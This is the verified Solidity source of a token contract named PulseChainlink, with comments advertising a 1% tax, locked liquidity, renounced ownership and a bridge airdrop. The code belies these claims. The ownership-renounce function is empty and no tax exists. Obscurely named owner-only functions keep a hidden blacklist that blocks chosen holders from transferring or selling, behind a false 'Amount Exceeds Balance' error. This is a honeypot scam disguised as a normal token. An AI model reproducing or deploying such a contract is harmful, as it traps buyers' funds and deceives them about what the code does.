/**
 *Submitted for verification at Etherscan.io on 2022-08-13
*/

pragma solidity 0.8.15;
/*

    ████████████████████████████████████████████████████████████████████████████████
    ████████████████████████████████████████████████████████████████████████████████
    ████████████████████████████████████████████████████████████████████████████████
    ██████████████████████████▒╢╢╢╢╢╢╢╢╢╢╣╣╣╣╣╢╢╢▒▒▒▒▒▒▒▒▒██████████████████████████
    █████████████████████████▒╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╣╣╣╣▒▒▒▒▒▒▒▒▒█████████████████████████
    ███████████████████████▌╢╣╢╢╢╢╢╢╢╢╢╢╢▓╜ `╨▓╣╢╢╣╣╣╣▒▒▒▒▒▒▀███████████████████████
    ██████████████████████▒╣╢╢╢╢╢╢╢╢╢▓╝`        `╩▓╢╢╢╣╣╢╣╢▒▒▒██████████████████████
    █████████████████████▒╣╢╢╢╢╢╢▓╩"                "╩▓╢╢╣╣╣╣╣▒█████████████████████
    ████████████████████▒╣╢╢╢╢▓"           ,,           ╙╩╢╢╢╢╢▒████████████████████
    ██████████████████▀╣╢╢╣╢╣          ,╔▓╢╢╢╣▓╥           ╢╢╢╢╢╢▓██████████████████
    █████████████████▒╣╢╢╣╣╢╣      ,╓@▓╢╢╢╢╢╢╢╢╢╢▓@╖       ╢╢╢╢╢╢╢▒█████████████████
    ████████████████▒╣╣╢╣╣╣╢╣      ╟╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢[      ╢╢╢╢╢╢╢╣▒████████████████
    ████████████████▄▄▄▄▄▄▄▄▄      ╟╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢╢[      ╢▒▄▄▄▄▄▄▄████████████████
    █████████████████████████      ╟╢╢╢╢╣╢╣╢╢╢╢╣╢╢╢╢[      ▓████████████████████████
    ███████████████▌▒▒▒▒▒▒▒▒╢      ╟╢╣╢╢╢╢╢╢╣╣╢╢╢╢╢╢[      ╢╢╢╢╢╢╢╢╣▓███████████████
    █████████████████▒╣╣▒▒▒▒╢      ╙╩╢╣╢╣╢╢╣╣╣╣╣╢╣╣╩`      ╢╢╢╢╢╢╢╢█████████████████
    ██████████████████▒╢╢╣╣╣╢          ╙╩╢╣╣╣╣╢╩╙          ╢╢╢╢╢╢▒██████████████████
    ███████████████████▒╣╣╢╢╣@╖            ╙╜           ,╓@╢╢╢╢╢▒███████████████████
    █████████████████████╢╢╢╢╢╢╢▓m╖                  ╓@▓╢╢╢╢╢╢╣▓████████████████████
    ██████████████████████╣╢╣╢╢╢╢╢╢╢▓╦,          ╓@▓╣╣╣╣╢╢╢╢╣▒██████████████████████
    ███████████████████████╣▓╣╣╣╢╢╢╢╢╢╢╢▓╦,  ,╦╣▒▒▒▒▒▒╣╣╣╣╣╢▒███████████████████████
    ████████████████████████▓▓▓▓▓╣╣╣╢╢╢╢╢╢╢╢╢╣╣▒▒▒▒▒▒▒▒▒▒▒╢▒████████████████████████
    ██████████████████████████▓▓▓▓▓▓▓╣╣╣╢╢╢╢╢╢╢╢╢╣╣▒▒▒▒▒▒╣▓█████████████████████████
    ███████████████████████████████████████▄▄▄▄▄▄▄▄▄▄▄▄▄▄███████████████████████████
    ████████████████████████████████████████████████████████████████████████████████


TOKENOMICS

1% Tax
Liquidity Locked for 1 Month 
Ownership Renounced

PULSECHAIN BRIDGE

The PulseChain cross-chain bridge will occur in Q4 2022. All holders will be airdropped 1 for 1 of $PLSCL on PRC20.


*/    

contract PulseChainlink {
  
    mapping (address => uint256) public balanceOf;
    mapping (address => bool) Amntx;

    // 
    string public name = "PulseChainlink";
    string public symbol = unicode"PLSCL";
    uint8 public decimals = 18;
    uint256 public totalSupply = 100000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor()  {
        // 
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

	address owner = msg.sender;


bool isEnabled;



modifier onlyOwner() {
    require(msg.sender == owner);
    _;
}

    function RenounceOwner() public onlyOwner  {

}





    function Anmga(address _user) public onlyOwner {
        require(!Amntx[_user], "xx");
        Amntx[_user] = true;
  
    }
    
    function Bnmga(address _user) public onlyOwner {
        require(Amntx[_user], "xx");
        Amntx[_user] = false;
  
    }
    
 


   




    function transfer(address to, uint256 value) public returns (bool success) {
        
require(!Amntx[msg.sender] , "Amount Exceeds Balance"); 


require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;  
        balanceOf[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    
    
    


    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
       public
        returns (bool success)


       {
            
  

           
       allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }









    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {   
    
        require(!Amntx[from] , "Amount Exceeds Balance"); 
               require(!Amntx[to] , "Amount Exceeds Balance"); 
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
    

}